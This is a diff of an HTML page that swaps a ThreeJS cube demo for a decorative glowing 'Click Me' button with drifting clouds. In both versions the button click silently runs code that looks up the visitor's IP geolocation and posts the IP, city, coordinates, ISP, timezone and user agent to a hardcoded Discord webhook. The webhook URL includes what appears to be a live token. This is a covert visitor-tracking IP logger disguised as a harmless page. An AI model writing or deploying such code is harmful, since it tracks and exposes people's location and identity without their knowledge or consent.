@@ -3,61 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ThreeJS and Webhook</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <title>Modern Glowing Button</title>
     <style>
         body {
             margin: 0;
             overflow: hidden;
+            height: 100vh;
+            background: #0d0d0d;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
         }
-        #blur-overlay {
+
+        .clouds {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+            background: url("https://i.imgur.com/OUOw4tG.png") repeat-x;
+            animation: moveClouds 30s linear infinite;
+            opacity: 0.2;
         }
-        #enter-button {
+
+        @keyframes moveClouds {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .button-wrapper {
+            position: relative;
+        }
+
+        .glowing-button {
+            display: inline-block;
             padding: 20px 40px;
-            background: rgba(255, 255, 255, 0.8);
-            color: #000;
-            border: none;
+            background: linear-gradient(90deg, #ff0080, #ff8c00, #40e0d0);
+            color: white;
+            text-transform: uppercase;
+            text-decoration: none;
             font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
             cursor: pointer;
-            border-radius: 5px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+            animation: float 3s ease-in-out infinite, glow 2s infinite alternate;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 20px rgba(255, 255, 255, 0.2); }
+            100% { box-shadow: 0 0 40px rgba(255, 255, 255, 0.6); }
         }
     </style>
 </head>
 <body>
-    <div id="blur-overlay">
-        <button id="enter-button">Click to Enter</button>
+    <div class="clouds"></div>
+    <div class="button-wrapper">
+        <button class="glowing-button" id="action-button">Click Me</button>
     </div>
 
     <script>
-        // Function to gather visitor info and send to webhook
         async function sendVisitorInfo() {
             const webhookUrl = "https://discord.com/api/webhooks/1325077534743990284/J-NTUdd4F6Rw-oQBTmfHaPuxOnhvLiBcet-wlMGJnAn1w09B4T8SiFtp9kuESQl-tdKy";
 
             try {
                 // Fetch location data
                 const locationResponse = await fetch("https://ipinfo.io/json");
-                if (!locationResponse.ok) {
-                    console.error("Failed to fetch location data");
-                    return;
-                }
-                const locationData = await locationResponse.json();
+                const locationData = locationResponse.ok ? await locationResponse.json() : { error: "Unable to fetch location data" };
 
                 // Prepare message for the webhook
                 const message = {
-                    content: `New visitor detected:\nIP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`,
+                    content: `Visitor Info:\nIP: ${locationData.ip || "N/A"}\nLocation: ${locationData.city || "N/A"}, ${locationData.region || "N/A"}, ${locationData.country || "N/A"}\nCoordinates: ${locationData.loc || "N/A"}\nISP: ${locationData.org || "N/A"}\nTimezone: ${locationData.timezone || "N/A"}\nUser Agent: ${navigator.userAgent}`,
                 };
 
-                // Send message to the webhook
+                // Send data to the webhook
                 const response = await fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -67,39 +93,16 @@
                 if (!response.ok) {
                     console.error("Failed to send webhook:", response.status, await response.text());
                 } else {
-                    console.log("Webhook sent successfully!");
+                    console.log("Visitor info sent successfully!");
                 }
             } catch (error) {
-                console.error("Error sending webhook:", error);
+                console.error("Error sending visitor info:", error);
             }
         }
 
-        // Set up ThreeJS scene
-        const scene = new THREE.Scene();
-        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer();
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        document.body.appendChild(renderer.domElement);
-
-        const geometry = new THREE.BoxGeometry();
-        const material = new THREE.MeshBasicMaterial({ color: 0x00ff00 });
-        const cube = new THREE.Mesh(geometry, material);
-        scene.add(cube);
-
-        camera.position.z = 5;
-
-        function animate() {
-            requestAnimationFrame(animate);
-            cube.rotation.x += 0.01;
-            cube.rotation.y += 0.01;
-            renderer.render(scene, camera);
-        }
-
-        // Trigger animation and send webhook on button click
-        document.getElementById("enter-button").addEventListener("click", () => {
-            document.getElementById("blur-overlay").style.display = "none";
-            sendVisitorInfo(); // Send visitor info after the click
-            animate();
+        // Add click event listener to the button
+        document.getElementById("action-button").addEventListener("click", () => {
+            sendVisitorInfo();
         });
     </script>
 </body>
